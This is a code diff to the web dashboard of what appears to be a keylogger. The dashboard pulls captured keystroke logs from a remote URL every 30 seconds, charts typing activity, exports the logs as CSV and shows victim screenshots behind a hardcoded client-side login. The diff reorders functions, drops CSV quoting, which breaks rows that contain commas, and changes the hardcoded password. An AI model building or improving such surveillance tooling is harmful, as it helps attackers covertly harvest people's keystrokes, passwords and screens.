@@ -165,33 +165,6 @@
             let keyPressData = []; // Store counts of key presses
             let timestamps = []; // Store timestamps
 
-            // Function to fetch keylogs
-            function fetchKeylog() {
-                fetch(keylogUrl)
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error('Network response was not ok ' + response.statusText);
-                        }
-                        return response.text();
-                    })
-                    .then(data => {
-                        document.getElementById('keylog-content').innerText = data;
-                        updateTimer();
-                        updateActivityChart(data); // Update the chart with the latest keylog data
-                    })
-                    .catch(error => logError('Error fetching keylog: ' + error));
-            }
-
-            // Timer for the last update
-            let lastUpdateTime;
-            function updateTimer() {
-                lastUpdateTime = new Date();
-                document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
-            }
-
-            fetchKeylog(); // Initial fetch
-            setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
-
             // Chart for typing activity
             const ctx = document.createElement('canvas');
             ctx.id = 'activityChart';
@@ -231,6 +204,33 @@
                 }
             });
 
+            // Function to fetch keylogs
+            function fetchKeylog() {
+                fetch(keylogUrl)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok ' + response.statusText);
+                        }
+                        return response.text();
+                    })
+                    .then(data => {
+                        document.getElementById('keylog-content').innerText = data;
+                        updateTimer();
+                        updateActivityChart(data); // Update the chart with the latest keylog data
+                    })
+                    .catch(error => logError('Error fetching keylog: ' + error));
+            }
+
+            // Timer for the last update
+            let lastUpdateTime;
+            function updateTimer() {
+                lastUpdateTime = new Date();
+                document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
+            }
+
+            fetchKeylog(); // Initial fetch
+            setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
+
             // Function to update the activity chart
             function updateActivityChart(keylog) {
                 const lines = keylog.split('\n');
@@ -263,7 +263,7 @@
                 fetch(keylogUrl)
                     .then(response => response.text())
                     .then(data => {
-                        const csvData = "Keylog\n" + data.split('\n').map(line => line.includes(',') ? `"${line}"` : line).join('\n');
+                        const csvData = "Keylog\n" + data.split('\n').map(line => line ? `${line}` : line).join('\n');
                         const blob = new Blob([csvData], { type: 'text/csv' });
                         const url = URL.createObjectURL(blob);
                         const a = document.createElement('a');
@@ -302,7 +302,7 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            if (username === "shrijay_baheti" && password === "shrijay@2007") { // Replace with real validation
+            if (username === "shrijay_baheti" && password === "shrjay@2007") { // Replace with real validation
                 document.getElementById('login-form').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
                 fetchLatestScreenshot(); // Fetch the latest screenshot after login
